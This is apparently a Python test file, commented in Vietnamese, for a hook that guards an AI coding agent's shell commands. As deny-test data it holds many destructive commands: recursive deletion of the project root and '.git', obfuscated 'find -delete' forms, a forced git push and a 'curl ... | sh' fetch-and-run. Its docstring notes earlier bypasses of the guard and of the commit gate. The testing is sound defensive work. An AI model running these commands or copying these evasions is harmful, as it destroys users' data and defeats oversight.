"""Phản hồi dự án đích 2026-10-23 (PLAN-3.17-feedback, Lát 1): xoá gốc dự án lọt guard (T-2501), `rm -rf` worktree
của chính repo bị chặn oan (T-2502), sửa file + `git commit` chung một lệnh lọt cổng commit (T-2503)."""

from __future__ import annotations

import os
import subprocess
import sys
import tempfile
import unittest
import unittest.mock as mock
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
# Luật guard được test ở pha harden; pha build nới hành động cục bộ (ADR-0040) — test riêng ở BuildPhaseGuardTest.
os.environ.setdefault("XT_GUARD_PHASE", "harden")


def _load_guard():
    sys.path.insert(0, str(ROOT / ".claude" / "hooks"))
    import guard as g

    return g


guard = _load_guard()


def policy(cmd: str, cwd: str | None = None, root: str = str(ROOT)) -> dict:
    """Kết quả ở chính sách mặc định (không hỏi): `decision` deny hoặc rỗng, kèm `code`."""
    with mock.patch.dict(os.environ, {"CLAUDE_PROJECT_DIR": root, "XT_GUARD_POLICY": ""}):
        return dict(guard.apply_policy(guard.bash_decision(cmd, root, cwd)))


R = str(ROOT)
NAME = ROOT.name


class WipeProjectRootTest(unittest.TestCase):
    """T-2501: xoá đệ quy chính gốc dự án, thư mục cha của nó hay `.git` của nó → deny ở mọi cách viết."""

    def test_guard_wipe_project_root_denied(self):
        for cmd, cwd in (
            (f"rm -rf {R}", None),
            (f"rm -rf {R}/", None),
            (f"rm -fr {R}", None),
            (f"rm -r -f {R}", None),
            (f"rm --recursive --force {R}", None),
            (f"rm -r {R}", None),
            ('rm -rf "$CLAUDE_PROJECT_DIR"', None),
            ('rm -rf "${CLAUDE_PROJECT_DIR}/"', "/"),
            ("rm -rf $PWD", None),
            ("rm -rf .", None),
            ("rm -rf ./", None),
            (f"rm -rf {R}/..", None),
            (f"rm -rf {ROOT.parent}", None),
            (f"rm -rf ../{NAME}", None),
            (f"rm -rf ../{NAME}/", None),
            (f"cd .. && rm -rf {NAME}", None),
            (f"cd {R}/scripts && rm -rf ..", None),
            (f"cd {R}/scripts && rm -rf ../../{NAME}", None),
            (f"rm -rf {R}/*", None),
            (f"rm -rf {R}/.git", None),
            ("rm -rf .git", None),
            (f"find {R} -delete", None),
            (f"find {R}/ -mindepth 1 -delete", None),
            (f"find {R} -exec rm -rf {{}} +", None),
            ("find . -exec rm -rf {} +", None),
            ("cd scripts && find . -delete", None),  # không phải gốc: luật cũ (`find .` không lọc) vẫn chặn
            (f"find {ROOT.parent} -delete", None),
            (f"bash -c 'rm -rf {R}'", None),
        ):
            with self.subTest(cmd=cmd):
                res = policy(cmd, cwd)
                self.assertEqual(res["decision"], "deny", res)

    def test_guard_wipe_project_root_reason(self):
        for cmd in (f"rm -rf {R}", f"rm -r {R}", f"cd .. && rm -rf {NAME}", f"find {R} -delete"):
            with self.subTest(cmd=cmd):
                res = policy(cmd)
                self.assertIn("gốc dự án", str(res["reason"]), res)
                self.assertEqual(res["code"], "WIPE_OUTSIDE", res)

    def test_guard_wipe_project_root_under_tmp(self):
        """Gốc dự án nằm trong thư mục tạm: thư mục cha (cũng trong /tmp) vẫn là tổ tiên của gốc → deny."""
        with tempfile.TemporaryDirectory() as tmp:
            proj = os.path.join(tmp, "proj")
            os.mkdir(proj)
            for cmd in (f"rm -rf {tmp}", f"rm -rf {proj}", "rm -rf ../proj", f"find {tmp} -delete"):
                with self.subTest(cmd=cmd):
                    self.assertEqual(policy(cmd, proj, proj)["decision"], "deny")
            # `proj-old`: trùng tiền tố tên gốc nhưng không phải tổ tiên
            for cmd in (f"rm -rf {tmp}/other", "rm -rf ../other", f"rm -rf {proj}/build", f"rm -rf {proj}-old"):
                with self.subTest(cmd=cmd):
                    self.assertEqual(policy(cmd, proj, proj)["decision"], "", cmd)

    def test_guard_wipe_project_root_subdirs_allowed(self):
        for cmd, cwd in (
            (f"rm -rf {R}/build", None),
            ("rm -rf node_modules", None),
            ("rm -rf dist", None),
            ("rm -rf ./dist/", None),
            (f"rm -f {R}/foo.txt", None),
            ("rm foo.txt", None),
            ("rm -rf scripts/__pycache__", None),
            ("cd scripts && rm -rf __pycache__", None),
            (f"find {R}/build -delete", None),
            (f"find {R}/scripts -name '*.pyc' -exec rm -f {{}} +", None),
        ):
            with self.subTest(cmd=cmd):
                res = policy(cmd, cwd)
                self.assertEqual(res["decision"], "", res)

    def test_guard_wipe_project_root_unknown(self):
        """Không mở được đích (biến lạ, `$OLDPWD`): không kết luận là gốc ở luật này (luật khác xử lý)."""
        self.assertFalse(guard._wipes_root("$X", R, R))
        self.assertFalse(guard._wipes_root("~-", R, R))
        self.assertFalse(guard._wipes_root(R, "", R))

    def test_guard_wipe_project_root_home_var(self):
        """Review 5ef1a14 B1: `$HOME`/`${HOME}` mở như `~` (HOME là cha của gốc)."""
        with mock.patch.dict(os.environ, {"HOME": str(ROOT.parent)}):
            for cmd in (f"rm -rf $HOME/{NAME}", f"rm -rf ${{HOME}}/{NAME}/", f"rm -rf ~/{NAME}"):
                with self.subTest(cmd=cmd):
                    self.assertEqual(policy(cmd)["decision"], "deny")
            self.assertEqual(policy(f"rm -rf $HOME/{NAME}/build")["decision"], "")

    def test_guard_wipe_project_root_glob(self):
        """Review 5ef1a14 B2 + 🟢: glob ngay dưới gốc khớp được `.git` hay mọi mục cấp một; mọi đích trong `gốc/.git/`."""
        for cmd, cwd in (
            (f"rm -rf {R}/.*", None),
            (f"rm -rf {R}/.g*", None),
            (f"rm -rf {R}/.gi?", None),
            (f"rm -rf {R}/.[a-z]*", None),
            (f"cd {R} && rm -rf .[!.]*", None),
            (f"rm -rf {R}/*/", None),
            (f"rm -rf {R}/?*", None),
            ("rm -rf *", f"{R}/scripts"),  # luật cũ (`*`) vẫn chặn ở thư mục con
            (f"rm -rf {R}/.g*/objects", None),
            (f"rm -rf {ROOT.parent}/{NAME[:3]}*", None),  # glob ở thư mục cha khớp tên gốc
            ("rm -rf /*", None),
            (f"rm -rf {R}/.git/objects", None),
            (f"rm -rf {R}/.git/refs", None),
            ("rm -rf .git/objects/", None),
        ):
            with self.subTest(cmd=cmd):
                self.assertEqual(policy(cmd, cwd)["decision"], "deny")
        for cmd, cwd in (
            (f"rm -rf {R}/build/*", None),
            ("rm -rf ./dist/*.js", None),
            (f"rm -rf {R}/*.pyc", None),
            (f"rm -rf {R}/*/node_modules", None),
            (f"rm -rf {R}/.github/*", None),
            ("rm -rf scripts/__pycache__/*", None),
        ):
            with self.subTest(cmd=cmd):
                self.assertEqual(policy(cmd, cwd)["decision"], "", cmd)
        with tempfile.TemporaryDirectory() as tmp:  # gốc trong /tmp: glob ở thư mục cha không khớp tên gốc → cho chạy
            proj = os.path.join(tmp, "proj")
            os.mkdir(proj)
            self.assertEqual(policy(f"rm -rf {tmp}/other*", proj, proj)["decision"], "")
            self.assertEqual(policy(f"rm -rf {tmp}/p*", proj, proj)["decision"], "deny")

    def test_guard_wipe_project_root_find_d153(self):
        """D-153 (thay D-151/D-152): `find` có `-delete`/`-exec…` bắt đầu từ gốc dự án, tổ tiên, `.git` của gốc, không
        có điểm bắt đầu khi đứng ở gốc, hay điểm bắt đầu không xác định → deny; quét CHUỖI GỐC (shlex cắt `\\(`/`\\;`)."""
        for cmd in (
            # lượt 1–3
            "find . -type f -delete",
            "find . -name '*' -delete",
            "find . -name .git -exec rm -rf {} +",
            "find . ! -name x -delete",
            "find . -name '*.pyc' -prune -o -delete",
            "find . -path '*/.git/*' -delete",
            "find . -regextype posix-extended -regex '.*' -delete",
            "find . \\( -name '*.pyc' -o -name .git \\) -delete",
            "find . -newer x -delete",
            # lượt 4
            "find . -delete -name x",
            "find . -name '*.py[co]' -delete",
            "find . -name .gitkeep -delete",
            "find . -name objects -exec rm -rf {} +",
            "nice -n 5 find . \\( -name '*' \\) -delete",
            "{ find . \\( -name '*' \\) -delete; }",
            "echo $(find . \\( -name '*' \\) -delete)",
            # lượt 5
            "timeout 5s find . \\( -name '*' \\) -delete",
            "env -u X find . \\( -name '*' \\) -delete",
            "if find . \\( -name '*' \\) -delete; then :; fi",
            ">/dev/null find . \\( -name '*' \\) -delete",
            "3>&1 find . \\( -name '*' \\) -delete",
            "find . -exec echo {} \\; -delete",
            "find . -name heads -exec rm -rf {} +",
            "find . -name pack -delete",
            "find . -path '*/objects/??/*' -delete",
            "find . -name '*0*' -delete",
            "find . -name '*.sample' -delete",
            "find . -exec sh -c 'rm -rf \"$0\"' {} \\;",
            "find . -exec mv {} /tmp/x \\;",
            # dạng điểm bắt đầu
            "find -delete",
            "find -L -delete",
            "/usr/bin/find . -name '*.pyc' -delete",
            "busybox find . -name '*.pyc' -delete",
            f"find {R} -name '*.pyc' -delete",
            f"find -H -O2 -D tree {R}/ -delete",
            f"find -- {R} -delete",
            f"find build {R} -delete",
            f"find {ROOT.parent} -name x -delete",
            "find .git -name '*.pyc' -delete",
            f"find {R}/.git/objects -type d -empty -delete",
            "find '.' -delete",
            'find "" -delete',
            "find \\. -delete",
            "find .; find build -delete",
            'find "$X" -delete',
            "find `pwd` -delete",
            "find $(pwd) -delete",
            "find b* -delete",
            "find {.,build} -delete",
            "find . -okdir rm {} \\;",
            # D-154: -exec từ gốc chỉ được miễn khi MỌI lệnh -exec chỉ đọc và không có -delete/-fprint*/-fls
            "find . -exec grep -q x {} \\; -delete",
            "find . -exec grep {} \\; -exec rm -rf {} +",
            "find . -exec sh -c 'grep x \"$0\"' {} \\;",
            "find . -exec truncate -s0 {} +",
            "find . -exec rg --pre ./x pat {} +",  # rg chạy lệnh qua --pre: không thuộc danh sách chỉ đọc
            "find . -exec {} \\;",
            "find . -exec $CMD {} \\;",
            "find . -exec",
            "find . -execdir python3 x.py {} +",
            "find . -exec xargs rm {} +",
            "find . -exec grep -l x {} + -fprint out.txt",
            "find . -exec cat {} + -fls out.txt",
            f"cd .. && find {NAME} -exec mv {{}} /tmp/x \\;",
            # review lượt 6: `cd`/`pushd`/`popd` trước find → điểm bắt đầu tương đối không xác định
            f"cd .. && find {NAME} \\( -name a \\) -delete",
            f"cd / && find {R[1:]} \\( -name a \\) -delete",
            f"pushd .. && find {NAME} \\( -name a \\) -delete",
            "cd .git && find objects \\( -name a \\) -delete",
            "cd src && find ../.git \\( -name a \\) -delete",
            "popd; find x \\( -name a \\) -delete",
            # tên `find` bị che bằng nháy/`\\`
            'fi""nd . \\( -name a \\) -delete',
            '"fi""nd" .git \\( -name a \\) -delete',
            "f\\ind . \\( -name a \\) -delete",
            "fin''d . \\( -name a \\) -delete",
            # -fprint*/-fls ghi vào .git
            "find . -fprint .git/config",
            "find . -fprintf .git/config x",
            "find . -fls .git/HEAD",
            f"find src -fprint0 {R}/.git/x",
            # miễn chỉ cho tên trần; bỏ `file` (`file -C` ghi magic.mgc)
            "find . -exec ./cat {} \\;",
            "find . -exec /bin/cat {} \\;",
            "find . -exec file -C {} +",
            f"cd .. && find {NAME} -delete",
            "bash -c 'find . -name x -delete'",
            "echo ok\nfind . \\\n  -delete",
        ):
            with self.subTest(cmd=cmd):
                res = policy(cmd)
                self.assertEqual(res["decision"], "deny", res)
        res = policy("find . -exec echo {} \\; -delete")
        self.assertIn("D-153", str(res["reason"]))
        self.assertEqual(res["code"], "WIPE_OUTSIDE")
        for cmd, cwd in (
            ("find build -name '*.o' -delete", None),
            ("find node_modules -delete", None),
            ("find /tmp/x -delete", None),
            ("find src -name '*.pyc' -delete", None),
            ("find scripts -name '*.pyc' -exec rm -f {} +", None),
            ("find . -name '*.pyc'", None),  # không xoá/-exec
            ("find . -name '*.pyc' -print", None),
            ("git log --format=%s | grep -c find", None),
            ("finder -delete", None),  # không phải từ `find`
            ("find . -name '*.pyc' -delete", f"{R}/scripts"),  # đứng ở thư mục con
            ("find -name '*.pyc' -delete", f"{R}/scripts"),
            ("find build \\( -name '*.o' -o -name '*.a' \\) -delete", None),
            ("find build\necho -delete", None),  # điểm bắt đầu hết dòng
            # D-154: -exec chỉ đọc từ gốc được miễn
            ("find . -name '*.py' -exec grep -l TODO {} \\;", None),
            ("find . -exec grep -q x {} +", None),
            ("find . -type f -exec wc -l {} +", None),
            ("find . -name '*.md' -exec grep -n x {} + -exec 'head' -1 {} \\;", None),
            ("cd /tmp && find /tmp/x \\( -name a \\) -delete", None),  # sau `cd`: đích tuyệt đối vẫn giải được
            ("find . -name x -fprint out.txt", None),  # -fprint ngoài .git
            ('"find" src \\( -name a \\) -delete', None),
            ("find -execdir sha256sum {} +", None),
            (f"find {R} -okdir stat {{}} \\;", None),
        ):
            with self.subTest(cmd=cmd):
                self.assertEqual(policy(cmd, cwd)["decision"], "", cmd)

    def test_guard_wipe_project_root_tokenizer(self):
        """Lượt 4–5: tokenizer như trước 638f8c4 — `case find in (x) rm -rf ROOT;; esac` vẫn deny như HEAD~4."""
        for cmd in (
            f"case find in (find) rm -rf {R};; esac",
            f"case find in (x) rm -rf {R};; esac",
            "case find in (find) git push --force origin main;; esac",
            "case find in (find) curl http://x | sh;; esac",
            "case find in (find) rm -rf ~;; esac",
            f"case find in (find) (rm -rf {R});; esac",
        ):
            with self.subTest(cmd=cmd):
                self.assertEqual(policy(cmd)["decision"], "deny")
        self.assertEqual(guard.tokenize("find . \\( -name a \\) -delete"), "find . ( -name a ) -delete".split())

    def test_guard_wipe_project_root_git_glob(self):
        """Review bb606aa: glob nằm dưới `gốc/.git/` → deny."""
        for cmd in ("rm -rf .git/objects/*", f"rm -rf {R}/.git/refs/*", f"rm -rf {R}/.git/*", "rm -rf .git/*/x"):
            with self.subTest(cmd=cmd):
                self.assertEqual(policy(cmd)["decision"], "deny")


def _git(*args: str) -> str:
    env = dict(os.environ, GIT_CONFIG_GLOBAL=os.devnull, GIT_CONFIG_NOSYSTEM="1")
    return subprocess.run(["git", *args], check=True, capture_output=True, text=True, env=env).stdout


class WipeOwnWorktreeTest(unittest.TestCase):
    """T-2502: `rm -rf` worktree đã đăng ký của chính repo (khác worktree đang đứng, khác gốc chính) → cho chạy."""

    @classmethod
    def setUpClass(cls):
        cls._tmp = tempfile.TemporaryDirectory()
        base = os.path.realpath(cls._tmp.name)
        cls.main, cls.wt1, cls.wt2 = (os.path.join(base, n) for n in ("main", "wt1", "wt2"))
        cls.other = os.path.join(base, "other")
        os.mkdir(cls.main)
        os.mkdir(cls.other)
        _git("-C", cls.main, "init", "-q")
        _git("-C", cls.main, "-c", "user.name=t", "-c", "user.email=t@e", "commit", "-q", "--allow-empty", "-m", "i")
        _git("-C", cls.main, "worktree", "add", "-q", cls.wt1)
        _git("-C", cls.main, "worktree", "add", "-q", cls.wt2)

    @classmethod
    def tearDownClass(cls):
        cls._tmp.cleanup()

    def setUp(self):
        # Repo tạm nằm dưới /tmp: bỏ miễn trừ thư mục tạm để worktree là "ngoài dự án" như ở máy thật.
        patcher = mock.patch.object(guard, "_temp_roots", return_value=[])
        patcher.start()
        self.addCleanup(patcher.stop)

    def test_guard_wipe_own_worktree_allowed(self):
        for cmd, cwd, root in (
            (f"rm -rf {self.wt1}", self.main, self.main),
            (f"rm -rf {self.wt1}/", self.main, self.main),
            ("rm -rf ../wt1", self.main, self.main),
            (f"rm -rf {self.wt1} {self.wt2}", self.main, self.main),
            (f"rm -rf {self.wt2}", self.wt1, self.wt1),  # phiên ở worktree phụ xoá worktree phụ khác
        ):
            with self.subTest(cmd=cmd, cwd=cwd):
                res = policy(cmd, cwd, root)
                self.assertEqual(res["decision"], "", res)

    def test_guard_wipe_own_worktree_current_or_main_denied(self):
        for cmd, cwd, root in (
            (f"rm -rf {self.wt1}", self.wt1, self.main),  # worktree đang đứng
            (f"cd {self.wt1} && rm -rf {self.wt1}", self.main, self.main),
            (f"rm -rf {self.main}", self.wt1, self.wt1),  # gốc chính (worktree đầu danh sách)
            (f"rm -rf {self.wt1}", self.wt1, self.wt1),  # chính gốc dự án
            (f"rm -rf {self.other}", self.main, self.main),  # không phải worktree
            (f"rm -rf {self.wt1}/sub", self.main, self.main),  # trong worktree, không phải chính worktree
            (f"rm -rf {self.wt1} {self.other}", self.main, self.main),
        ):
            with self.subTest(cmd=cmd, cwd=cwd):
                res = policy(cmd, cwd, root)
                self.assertEqual(res["decision"], "deny", res)

    def test_guard_wipe_own_worktree_concurrent(self):
        """Hook chạy song song (nhiều lệnh Bash cùng lúc): mỗi quyết định độc lập, không lẫn kết quả."""
        cases = [(f"rm -rf {self.wt1}", self.main, ""), (f"rm -rf {self.wt1}", self.wt1, "deny")] * 8

        def run(case):
            cmd, cwd, _ = case
            return guard.apply_policy(guard.bash_decision(cmd, self.main, cwd))["decision"]

        env = {"CLAUDE_PROJECT_DIR": self.main, "XT_GUARD_POLICY": ""}
        with mock.patch.dict(os.environ, env), ThreadPoolExecutor(max_workers=8) as pool:
            got = list(pool.map(run, cases))
        self.assertEqual(got, [want for _, _, want in cases])

    def test_guard_wipe_own_worktree_git_error_denied(self):
        """Không đọc được `git worktree list` (hết giờ, lỗi, không phải repo) → chiều chặt: deny như cũ."""
        boom = subprocess.TimeoutExpired(["git"], 5)
        with mock.patch.object(guard.subprocess, "run", side_effect=boom):
            self.assertEqual(policy(f"rm -rf {self.wt1}", self.main, self.main)["decision"], "deny")
        with mock.patch.object(guard.subprocess, "run", side_effect=OSError("no git")):
            self.assertEqual(policy(f"rm -rf {self.wt1}", self.main, self.main)["decision"], "deny")
        self.assertEqual(policy(f"rm -rf {self.wt1}", self.other, self.other)["decision"], "deny")


class CommitAfterWriteTest(unittest.TestCase):
    """T-2503: cổng commit chạy trên cây TRƯỚC lệnh → lệnh ghi file đứng trước `git commit` cùng lệnh → deny."""

    def test_guard_commit_after_write_denied(self):
        for cmd in (
            "python3 sửa.py && git commit -m 'fix: x'",
            "sed -i s/a/b/ f.txt && git commit -m 'fix: x'",
            "echo x > f.txt; git commit -m 'fix: x'",
            "git status > s.txt && git commit -m 'fix: x'",
            "git diff --output=p.diff && git commit -m 'fix: x'",
            "make fmt && git add -A && git commit -m 'fix: x'",
            "git add -A && ruff format . && git commit -m 'fix: x'",
            "bash -c \"sed -i s/a/b/ f.txt && git commit -m 'fix: x'\"",
            "cd scripts && touch a && git -C .. commit -m 'fix: x'",
            "cat > f.txt <<'EOF' && git commit -m 'fix: x'\nx\nEOF",
            "echo x | tee f.txt && git commit -m 'fix: x'",
            "git commit -m 'fix: a' && sed -i s/a/b/ f.txt && git commit -m 'fix: b'",
            "echo `touch f` && git commit -m 'fix: x'",  # review 5ef1a14 M2: backtick như `$(…)`
            "echo $(touch f) && git commit -m 'fix: x'",
            "git add \"`touch f`\" && git commit -m 'fix: x'",
        ):
            with self.subTest(cmd=cmd):
                res = policy(cmd)
                self.assertEqual(res["decision"], "deny", res)
                self.assertIn("Tách lệnh", str(res["reason"]), res)

    def test_guard_commit_after_write_allowed(self):
        for cmd in (
            "git commit -m 'fix: x'",
            "git commit -F - <<'EOF'\nfix: x\n\nthân > có dấu lớn hơn\nEOF",
            "git add -A && git commit -m 'fix: x'",
            "cd scripts && git add . && git commit -m 'fix: x'",
            "export A=1; B=2 git commit -m 'fix: x'",
            "git status && git diff && git log -1 && git commit -m 'fix: x'",
            "true && git commit -m 'fix: x'",
            "git add -A 2>/dev/null && git commit -m 'fix: x'",
            "git commit -m 'fix: x' && echo xong > /dev/null",
            "cat <<'EOF' | git commit -F -\nfix: x\nEOF",
            "printf 'fix: x' | git commit -F -",
            "echo ok 2>/dev/null; git commit -m 'fix: x'",
            "echo x > f.txt",  # ghi file không kèm commit
        ):
            with self.subTest(cmd=cmd):
                res = policy(cmd)
                self.assertEqual(res["decision"], "", res)


if __name__ == "__main__":
    unittest.main()
